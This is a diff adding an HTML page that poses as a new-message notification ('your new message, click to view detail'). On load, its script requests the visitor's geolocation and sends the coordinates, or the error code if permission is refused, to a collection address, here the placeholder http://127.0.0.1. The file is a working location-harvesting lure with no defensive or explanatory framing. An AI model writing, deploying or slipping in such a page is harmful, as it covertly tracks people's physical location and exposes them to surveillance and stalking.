@@ -1,0 +1,56 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>your message</title>
+</head>
+<body>
+<p id="demo">your new message, click to view detail</p>
+<script>
+getLocation()
+
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if(navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, handleError);
+  } else {}
+}
+
+function showPosition(pos) {
+  var xy = "pos: " + pos.coords.latitude + "," + pos.coords.longitude;
+
+  x.innerHTML="Latitude: " + pos.coords.latitude + "<br />Longitude: " + pos.coords.longitude;
+
+  var xhr = new XMLHttpRequest();
+  xhr.open("get", "http://127.0.0.1?data=" + xy, true);
+  xhr.send(null);
+}
+
+function handleError(err) {
+  var errMsg;
+  switch(err.code) {
+    case err.PERMISSION_DENIED:
+      errMsg = "PERMISSION_DENIED";
+      break;
+    case err.POSITION_UNAVAILABLE:
+      errMsg = "POSITION_UNAVAILABLE";
+      break;
+    case err.TIMEOUT:
+      errMsg = "TIMEOUT";
+      break;
+    case err.UNKNOWN_ERROR:
+      errMsg = "UNKNOWN_ERROR";
+      break;
+  }
+
+  x.innerHTML = errMsg;
+
+  var xhr = new XMLHttpRequest();
+  xhr.open("get", "http://127.0.0.1?data=" + errMsg, true);
+  xhr.send(null);
+}
+
+</script>
+</body>
+</html>
+
